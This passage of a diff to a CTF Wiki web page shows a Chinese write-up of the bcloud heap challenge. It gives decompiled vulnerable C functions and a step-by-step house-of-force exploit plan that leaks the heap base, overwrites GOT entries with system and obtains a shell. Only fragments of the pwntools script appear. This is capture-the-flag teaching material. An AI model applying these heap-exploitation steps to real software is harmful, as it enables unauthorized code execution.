-<span class=w>  </span><span class=n>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mh>0x50u</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Input your name:&quot;</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=n>read_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=mi>64</span><span class=p>,</span><span class=w> </span><span class=sc>&#39;\n&#39;</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=n>tmp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x40u</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=n>name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tmp</span><span class=p>;</span><span class=w></span>
-<span class=w>  </span><span class=n>strcpy</span><span class=p>(</span><span class=n>tmp</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>s</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=n>info</span><span class=p>(</span><span class=n>tmp</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>v3</span><span class=p>;</span><span class=w></span>
-<span class=p>}</span><span class=w></span>
-</code></pre></div> <p>这里如果程序读入的名字为64个字符，那么当程序在使用info函数输出对应的字符串时，就会输出对应的tmp指针内容，也就是说<strong>泄露了堆的地址</strong>。。</p> <p>初始化组织和org的时候存在漏洞</p> <div class=highlight><pre><span></span><code><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>init_org_host</span><span class=p>()</span><span class=w></span>
-<span class=p>{</span><span class=w></span>
+<span class=w>  </span><span class=n>v3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
+<span class=w>  </span><span class=n>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mh>0x50u</span><span class=p>);</span>
+<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Input your name:&quot;</span><span class=p>);</span>
+<span class=w>  </span><span class=n>read_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=mi>64</span><span class=p>,</span><span class=w> </span><span class=sc>&#39;\n&#39;</span><span class=p>);</span>
+<span class=w>  </span><span class=n>tmp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x40u</span><span class=p>);</span>
+<span class=w>  </span><span class=n>name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tmp</span><span class=p>;</span>
+<span class=w>  </span><span class=n>strcpy</span><span class=p>(</span><span class=n>tmp</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>s</span><span class=p>);</span>
+<span class=w>  </span><span class=n>info</span><span class=p>(</span><span class=n>tmp</span><span class=p>);</span>
+<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>v3</span><span class=p>;</span>
+<span class=p>}</span>
+</code></pre></div> <p>这里如果程序读入的名字为64个字符，那么当程序在使用info函数输出对应的字符串时，就会输出对应的tmp指针内容，也就是说<strong>泄露了堆的地址</strong>。。</p> <p>初始化组织和org的时候存在漏洞</p> <div class=highlight><pre><span></span><code><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>init_org_host</span><span class=p>()</span>
+<span class=p>{</span>
 <span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>s</span><span class=p>;</span><span class=w> </span><span class=c1>// [esp+1Ch] [ebp-9Ch]</span>
 <span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>v2</span><span class=p>;</span><span class=w> </span><span class=c1>// [esp+5Ch] [ebp-5Ch]</span>
 <span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>v3</span><span class=p>;</span><span class=w> </span><span class=c1>// [esp+60h] [ebp-58h]</span>
 <span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>v4</span><span class=p>;</span><span class=w> </span><span class=c1>// [esp+A4h] [ebp-14h]</span>
 <span class=w>  </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>v5</span><span class=p>;</span><span class=w> </span><span class=c1>// [esp+ACh] [ebp-Ch]</span>
 
-<span class=w>  </span><span class=n>v5</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=n>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mh>0x90u</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Org:&quot;</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=n>read_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=mi>64</span><span class=p>,</span><span class=w> </span><span class=mi>10</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Host:&quot;</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=n>read_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v3</span><span class=p>,</span><span class=w> </span><span class=mi>64</span><span class=p>,</span><span class=w> </span><span class=mi>10</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=n>v4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x40u</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=n>v2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x40u</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=n>org</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v2</span><span class=p>;</span><span class=w></span>
-<span class=w>  </span><span class=n>host</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v4</span><span class=p>;</span><span class=w></span>
-<span class=w>  </span><span class=n>strcpy</span><span class=p>(</span><span class=n>v4</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>v3</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=n>strcpy</span><span class=p>(</span><span class=n>v2</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>s</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;OKay! Enjoy:)&quot;</span><span class=p>);</span><span class=w></span>
-<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>v5</span><span class=p>;</span><span class=w></span>
-<span class=p>}</span><span class=w></span>
+<span class=w>  </span><span class=n>v5</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
+<span class=w>  </span><span class=n>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mh>0x90u</span><span class=p>);</span>
+<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Org:&quot;</span><span class=p>);</span>
+<span class=w>  </span><span class=n>read_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=mi>64</span><span class=p>,</span><span class=w> </span><span class=mi>10</span><span class=p>);</span>
+<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Host:&quot;</span><span class=p>);</span>
+<span class=w>  </span><span class=n>read_str</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v3</span><span class=p>,</span><span class=w> </span><span class=mi>64</span><span class=p>,</span><span class=w> </span><span class=mi>10</span><span class=p>);</span>
+<span class=w>  </span><span class=n>v4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x40u</span><span class=p>);</span>
+<span class=w>  </span><span class=n>v2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x40u</span><span class=p>);</span>
+<span class=w>  </span><span class=n>org</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v2</span><span class=p>;</span>
+<span class=w>  </span><span class=n>host</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v4</span><span class=p>;</span>
+<span class=w>  </span><span class=n>strcpy</span><span class=p>(</span><span class=n>v4</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>v3</span><span class=p>);</span>
+<span class=w>  </span><span class=n>strcpy</span><span class=p>(</span><span class=n>v2</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>s</span><span class=p>);</span>
+<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;OKay! Enjoy:)&quot;</span><span class=p>);</span>
+<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>v5</span><span class=p>;</span>
+<span class=p>}</span>
 </code></pre></div> <p>当读入组织时，给定 64 字节，会覆盖 v2 的低地址。与此同时，我们可以知道 v2 是与 top chunk 相邻的 chunk，而 v2 恰好与 org 相邻，那么由于在 32 位程序中，一般都是 32 位全部都使用，这里 v2 所存储的内容，几乎很大程度上都不是 <code>\x00</code> ，所以当执行 strcpy 函数向 v2 中拷贝内容时，很有可能会覆盖top chunk。这就是漏洞所在。</p> <h3 id=_9>利用<a class=headerlink href=#_9 title="Permanent link">&para;</a></h3> <ol> <li>利用初始化名字处的漏洞泄漏堆的基地址。。</li> <li>利用 house of force 将 top chunk 分配至全局的 0x0804B0A0 的 &amp;notesize-8 处，当再次申请内存时，便返回notesize地址处的内存，从而我们就可以控制所有note的大小以及对应的地址了。</li> <li>修改前三个 note 的大小为16，并修改其指针为 free@got，atoi@got，atoi@got</li> <li>将 free@got 修改为 puts@plt。</li> <li>泄漏 atoi 地址。</li> <li>再次修改另外一个 atoi got 项为 system 地址，从而拿到shell。</li> </ol> <p>具体脚本如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
 <span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;gnome-terminal&#39;</span><span class=p>,</span> <span class=s1>&#39;-x&#39;</span><span class=p>,</span> <span class=s1>&#39;sh&#39;</span><span class=p>,</span> <span class=s1>&#39;-c&#39;</span><span class=p>]</span>
 <span class=k>if</span> <span class=n>args</span><span class=p>[</span><span class=s1>&#39;DEBUG&#39;</span><span class=p>]:</span>
@@ -324,7 +324,7 @@ bcloud: ELF <span class=m>32</span>-bit LSB executable, Intel <span class=m>8038
 
 <span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&quot;__main__&quot;</span><span class=p>:</span>
     <span class=n>exp</span><span class=p>()</span>
-</code></pre></div> <h2 id=_10>题目<a class=headerlink href=#_10 title="Permanent link">&para;</a></h2> <ul> <li><a href=https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6>2016 Boston Key Party CTF cookbook</a></li> </ul> </article> </div> </div> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../house-of-einherjar/ class="md-footer__link md-footer__link--prev" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Previous </span> House Of Einherjar </div> </div> </a> <a href=../house-of-lore/ class="md-footer__link md-footer__link--next" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Next </span> House of Lore </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-footer-copyright> <div class=md-footer-copyright__highlight> Copyright &copy; 2016 - 2022 CTF Wiki Team </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs Insiders </a> </div> </div> </div> </footer> </div> <script src=../../../../../../assets/javascripts/vendor.191088e8.min.js></script> <script src=../../../../../../assets/javascripts/bundle.d4cf0930.min.js></script><script id=__lang type=application/json>{"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing"}</script> <script>
+</code></pre></div> <h2 id=_10>题目<a class=headerlink href=#_10 title="Permanent link">&para;</a></h2> <ul> <li><a href=https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6>2016 Boston Key Party CTF cookbook</a></li> </ul> </article> </div> </div> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../house-of-einherjar/ class="md-footer__link md-footer__link--prev" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Previous </span> House Of Einherjar </div> </div> </a> <a href=../house-of-lore/ class="md-footer__link md-footer__link--next" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Next </span> House of Lore </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-footer-copyright> <div class=md-footer-copyright__highlight> Copyright &copy; 2016 - 2023 CTF Wiki Team </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs Insiders </a> </div> </div> </div> </footer> </div> <script src=../../../../../../assets/javascripts/vendor.191088e8.min.js></script> <script src=../../../../../../assets/javascripts/bundle.d4cf0930.min.js></script><script id=__lang type=application/json>{"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing"}</script> <script>
         app = initialize({
           base: "../../../../../..",
           features: ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share"],
